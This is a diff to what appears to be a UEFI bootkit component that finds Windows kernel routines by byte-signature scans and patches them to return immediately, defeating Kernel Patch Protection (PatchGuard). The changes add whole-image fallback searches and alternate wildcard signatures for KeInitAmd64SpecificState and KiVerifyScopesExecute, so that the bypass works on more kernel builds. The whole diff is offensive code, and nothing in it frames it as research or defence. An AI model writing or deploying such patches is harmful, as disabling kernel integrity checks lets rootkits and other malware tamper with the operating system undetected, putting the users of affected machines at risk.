@@ -28,6 +28,7 @@
 //
 extern VOID DebugAppend(IN CONST CHAR16 *Str);
 extern VOID DebugAppendHex(IN UINT64 Value);
+extern VOID DebugAppendDec(IN UINTN Value);
 
 //
 // CR0 Write-Protection bit manipulation
@@ -191,8 +192,10 @@ PatchKpp(
     {
         PE_SECTION_HEADER *TextSect = PeFindSection(NtoskrnlBase, ".text");
         if (TextSect != NULL) {
+            UINTN vs = TextSect->VirtualSize;
+            UINTN rs = TextSect->SizeOfRawData;
             TextBase = (UINT8 *)NtoskrnlBase + TextSect->VirtualAddress;
-            TextSize = TextSect->SizeOfRawData;
+            TextSize = (vs > rs) ? vs : rs;
         } else {
             TextBase = (UINT8 *)NtoskrnlBase;
             TextSize = NtoskrnlSize;
@@ -203,21 +206,28 @@ PatchKpp(
     {
         PE_SECTION_HEADER *InitSect = PeFindSection(NtoskrnlBase, "INIT");
         if (InitSect != NULL) {
+            UINTN vs = InitSect->VirtualSize;
+            UINTN rs = InitSect->SizeOfRawData;
             InitBase = (UINT8 *)NtoskrnlBase + InitSect->VirtualAddress;
-            InitSize = InitSect->SizeOfRawData;
+            InitSize = (vs > rs) ? vs : rs;
+            DebugAppend(L"I:");
+            DebugAppendDec(InitSize / 1024);
+            DebugAppend(L"K ");
+        } else {
+            DebugAppend(L"I:NF ");
         }
     }
 
     //
     // 1. Patch KeInitAmd64SpecificState (INIT section, unique idiv pattern)
     //    This is the most critical PG function — MUST be patched.
+    //    Search: INIT -> .text -> entire image as fallback
     //
     {
         CHAR8 FullMask[sizeof(SigKeInitAmd64) + 1];
         SetMem(FullMask, sizeof(SigKeInitAmd64), 'x');
         FullMask[sizeof(SigKeInitAmd64)] = '\0';
 
-        // Search INIT first, then .text as fallback
         Match = NULL;
         if (InitBase != NULL && InitSize > 0) {
             Match = PatternScan(InitBase, InitSize,
@@ -227,9 +237,13 @@ PatchKpp(
             Match = PatternScan(TextBase, TextSize,
                 SigKeInitAmd64, FullMask, sizeof(SigKeInitAmd64));
         }
+        // Fallback: search entire image
+        if (Match == NULL) {
+            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
+                SigKeInitAmd64, FullMask, sizeof(SigKeInitAmd64));
+        }
 
         if (Match != NULL) {
-            // Use .pdata for reliable function start detection
             VOID *FuncStart = PeFindFunctionStart(NtoskrnlBase, Match);
             if (FuncStart != NULL) {
                 Patched |= ApplyRetPatch(FuncStart);
@@ -238,7 +252,41 @@ PatchKpp(
                 DebugAppend(L"K1:FS ");
             }
         } else {
-            DebugAppend(L"K1:NF ");
+            // Try alternate shorter pattern: cdq + idiv with wildcard registers
+            // Matches: ror r32,1 / mov r32,r32 / cdq / REX idiv r?d
+            STATIC CONST UINT8 SigK1Alt[] = {
+                0xD1, 0x00,             // ror r32, 1 (wildcard reg)
+                0x8B, 0x00,             // mov r32, r32 (wildcard)
+                0x99,                   // cdq
+                0x41, 0xF7, 0x00        // idiv r?d (wildcard rm)
+            };
+            STATIC CONST CHAR8 MaskK1Alt[] = "x?x?xxx?";
+            // Also try without REX (idiv eXX)
+            STATIC CONST UINT8 SigK1AltNoRex[] = {
+                0xD1, 0x00,             // ror r32, 1
+                0x8B, 0x00,             // mov r32, r32
+                0x99,                   // cdq
+                0xF7, 0x00              // idiv r32 (no REX)
+            };
+            STATIC CONST CHAR8 MaskK1AltNoRex[] = "x?x?xx?";
+
+            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
+                SigK1Alt, MaskK1Alt, sizeof(SigK1Alt));
+            if (Match == NULL) {
+                Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
+                    SigK1AltNoRex, MaskK1AltNoRex, sizeof(SigK1AltNoRex));
+            }
+            if (Match != NULL) {
+                VOID *FuncStart = PeFindFunctionStart(NtoskrnlBase, Match);
+                if (FuncStart != NULL) {
+                    Patched |= ApplyRetPatch(FuncStart);
+                    DebugAppend(L"K1a ");
+                } else {
+                    DebugAppend(L"K1a:FS ");
+                }
+            } else {
+                DebugAppend(L"K1:NF ");
+            }
         }
     }
 
@@ -268,6 +316,7 @@ PatchKpp(
 
     //
     // 3. Patch KiVerifyScopesExecute (INIT section, 0xFEFFFFFFFFFFFFFF constant)
+    //    Search: INIT -> .text -> entire image
     //
     {
         Match = NULL;
@@ -278,6 +327,24 @@ PatchKpp(
         if (Match == NULL) {
             Match = PatternScan(TextBase, TextSize,
                 SigKiVerifyScopes, MaskKiVerifyScopes, sizeof(SigKiVerifyScopes));
+        }
+        // Fallback: search entire image
+        if (Match == NULL) {
+            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
+                SigKiVerifyScopes, MaskKiVerifyScopes, sizeof(SigKiVerifyScopes));
+        }
+
+        // If full pattern not found, try just the unique constant
+        if (Match == NULL) {
+            STATIC CONST UINT8 SigK3Alt[] = {
+                0x48, 0xB8,             // mov rax, imm64
+                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE
+            };
+            CHAR8 K3AltMask[sizeof(SigK3Alt) + 1];
+            SetMem(K3AltMask, sizeof(SigK3Alt), 'x');
+            K3AltMask[sizeof(SigK3Alt)] = '\0';
+            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
+                SigK3Alt, K3AltMask, sizeof(SigK3Alt));
         }
 
         if (Match != NULL) {
